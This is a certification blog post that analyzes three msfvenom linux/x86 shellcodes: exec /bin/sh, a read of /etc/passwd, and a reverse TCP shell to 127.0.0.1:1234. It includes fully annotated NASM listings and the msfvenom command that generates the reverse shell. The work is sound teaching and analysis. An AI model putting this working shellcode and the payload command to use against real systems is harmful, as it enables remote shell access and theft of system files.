---
title: "SLAE x86 - Assignment 0x5"
date: 2021-10-23T01:10:31Z
draft: false
tags:
  - exploit_dev
  - assembly
categories:
  - certification
keywords:
  - slae
  - shellcode
  - assembly
---

# Shellcode Analysis
## Objectives
- Take up at least 3 shellcode samples created using msfpayload for linux/x86
- Use GDB/ndisasm/libemu to dissect the functionality of the shellcode
- Present analysis

## MSFvenom
The [msfpayload](https://www.offensive-security.com/metasploit-unleashed/msfpayload/) has been replaced already by [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/). It is the combination of msfpayload and [msfencode](https://www.offensive-security.com/metasploit-unleashed/msfencode/). See more details from [Rapid7's blog](https://www.rapid7.com/blog/post/2014/12/09/good-bye-msfpayload-and-msfencode/)

## MSF Exec Shellcode
Using [msfvenom](#msfvenom), a shellcode utilizing `execve` syscall to execute `/bin/sh` can be generated. See screenshot below showing how to extract the nasm code by passing the shellcode into `ndisasm` tool:

![](Pasted%20image%2020211023095223.png)

Some explanation via comments inline in every instruction are shown in the nasm code below, the first two columns are removed to have proper highlighting of the code:

```nasm
global _start

section .text

_start:
  push byte +0xb          ; push 0xb into stack
  pop eax                 ; execve(2) code
  cdq                     ; clear edx
  push edx                ; push NULL
  push word 0x632d        ; push '-c'
  mov edi,esp             ; edi = '-c' address in stack
  push dword 0x68732f     ; push '/sh', esp = '/sh'
  push dword 0x6e69622f   ; push '/bin', esp = '/bin/sh'
  mov ebx,esp             ; ebx = esp_address
  push edx                ; push NULL
  call 0x20               ; jump to 0x20 and push next instruction's address into stack
  jnc 0x87                ; equivalent to "sh"
                          ; using gdb, 0x20 is: push edi; push ebx
                          ; see screenshot following this code block
  add [edi+0x53],dl       ; esp = "/bin/sh -c sh"
  mov ecx,esp             ; ecx = esp_address
  int 0x80                ; syscall execve(first_binsh_addr, second_binsh_addr, NULL)
```
Checking with GDB, as mentioned in line 18 the address 0x20 contains the following instructions:

![](Pasted%20image%2020211023100713.png)

Furthermore, after the call function, `sh` string's address is pushed into the stack:

![](Pasted%20image%2020211023101329.png)

See the changes in the stack and registers while executing the the instructions one-by-one:

![](msf_exec.gif)

## MSF Read File Shellcode
Using [msfvenom](#msfvenom), a shellcode utilizing `open - read - write - exit` can be generated to read a file within the system specified by the `PATH`. See screenshot below showing how to extract the nasm code by passing the shellcode into `ndisasm` tool:

![](Pasted%20image%2020211023104015.png)

The same approach with [previous section](#msf-exec-shellcode), see the nasmi code below containing the explanation inline with the instructions:
```nasm
global _start

section .text

_start:
  jmp short 0x38  ; jump to call 0x2
  mov eax,0x5     ; open(2)
  pop ebx         ; address of "/etc/passwd\x00"
  xor ecx,ecx     ; clear ecx
  int 0x80        ; syscall open("/etc/passwd\x00", NULL)

  mov ebx,eax     ; ebx = fd
  mov eax,0x3     ; read(2)
  mov edi,esp     ; edi = esp
  mov ecx,edi     ; ecx = esp address
  mov edx,0x1000  ; edx = 4096
  int 0x80        ; syscall read(fd, "/etc/passwd\x00", 4096)

  mov edx,eax     ; edx = read size
  mov eax,0x4     ; write(2)
  mov ebx,0x1     ; fd = stdout
  int 0x80        ; syscall write(stdout, "/etc/passwd\x00", read_size)

  mov eax,0x1     ; _exit(2)
  mov ebx,0x0     ; clear ebx
  int 0x80        ; syscall _exit
  call 0x2        ; jump to mov eax,0x5 and push "/etc/passwd\x00" address into stack

                  ; 3D-48 = "/etc/passwd\x00", see screenshot after this code block
  das             ; 0000003D  2F
  gs jz 0xa4      ; 0000003E  657463
  das             ; 00000041  2F
  jo 0xa5         ; 00000042  7061
  jnc 0xb9        ; 00000044  7373
  ja 0xac         ; 00000046  7764
  db 0x00         ; 00000048  00
```

A pry session below shows the conversion of the shellcode bytes in lines 30 - 36 into string

![](Pasted%20image%2020211023105353.png)

The next screenshots will be showing the status of the registers and stack right before every syscall:

### Open(2)
![](Pasted%20image%2020211023110040.png)
### Read(2)
![](Pasted%20image%2020211023110723.png)
### Write(2)
![](Pasted%20image%2020211023110404.png)
### Exit(2)
![](Pasted%20image%2020211023110512.png)

## MSF Reverse TCP Shellcode
Using [msfvenom](#msfvenom), a reverse TCP shellcode can be generated with payload shell_reverse_tcp specifying the `LHOST` and `LPORT`, the listeing IP and port. See screenshot below showing how to extract the nasm code by passing the shellcode into `ndisasm` tool:

![](Pasted%20image%2020211023111233.png)

To better visualize the execution flow of the instructions, see the graph generated using [`libemu's sctest`](https://github.com/buffer/libemu) and [`dot tool`](https://graphviz.org/) (the tools same used in [Reverse TCP Shellcode Assignment](../slae_x86_a2#structure)) below:

![](reverse_tcp_shellcode.png)

 Generated using:
 ```zsh {linenos=false}
 msfvenom --arch x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1234 -f raw | sctest -vvv -Ss 10000 -G reverse_tcp_shellcode.dot
 dot reverse_tcp_shellcode.dot -T png -o reverse_tcp_shellcode.png
 ```

 As with previous two shellcodes, see the nasm code below with inline comments for explanation of the instructions:
 ```nasm
global _start

section .text

_start:
  xor ebx,ebx           ; clear ebx
  mul ebx               ; clear eax and edx
  push ebx              ; push NULL
  inc ebx               ; ebx = 0x1
  push ebx              ; push 0x1 ; SOCK_STREAM
  push byte +0x2        ; push 0x2 ; AF_INET
  mov ecx,esp           ; ecx = esp address
  mov al,0x66           ; socketcall(2)
  int 0x80              ; syscall(SYS_socketcall, SYS_SOCKET = 0x1,
                        ;         *args(AF_INET, SOCK_STREAM))
                        ; source: /usr/include/linux/net.h

  xchg eax,ebx          ; ebx = sockfd, eax = 0x1
  pop ecx               ; ecx = 0x2
  mov al,0x3f           ; dup2(2)
  int 0x80              ; syscall dup2(sockfd, fd)
  dec ecx               ; decrement ecx by 1 to cover file descriptors 2, 1, and 0
  jns 0x11              ; jump to al, 0x3f to start dup2 again until ecx = 0x0

  push dword 0x100007f  ; push IP_ADDR = 127.0.0.1
  push dword 0xd2040002 ; push PORT = 1234(0xd204) and AF_INET = 0x0002
  mov ecx,esp           ; ecx = esp_address(sockaddr {AF_INET; PORT; IP_ADDR})
  mov al,0x66           ; socketcall(2)
  push eax              ; push 0x66
  push ecx              ; push esp_address(sockaddr {AF_INET; PORT; IP_ADDR})
  push ebx              ; push sockfd
  mov bl,0x3            ; ebx = 0x3
  mov ecx,esp           ; ecx = esp_address(sockfd, sockaddr, 0x66)
  int 0x80              ; syscall(SYS_socketcall, SYS_CONNECT = 0x3, *args(esp_address))

  push edx              ; push NULL
  push dword 0x68732f6e ; push "n/sh"
  push dword 0x69622f2f ; push "//bi"
  mov ebx,esp           ; ebx = esp_address("//bin/sh")
  push edx              ; push NULL
  push ebx              ; push esp_address
  mov ecx,esp           ; ecx = esp_address(esp_address("//bin/sh"), NULL)
  mov al,0xb            ; execve(2)
  int 0x80              ; syscall execve(first_binsh_addr, second_binsh_addr, NULL)
 ```

---
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE - 1558

---
[`Link to Github repository`](https://github.com/jsnv-dev/slae_x86_assignments/tree/main/A5) | [`Link to index page`](../slae_x86)
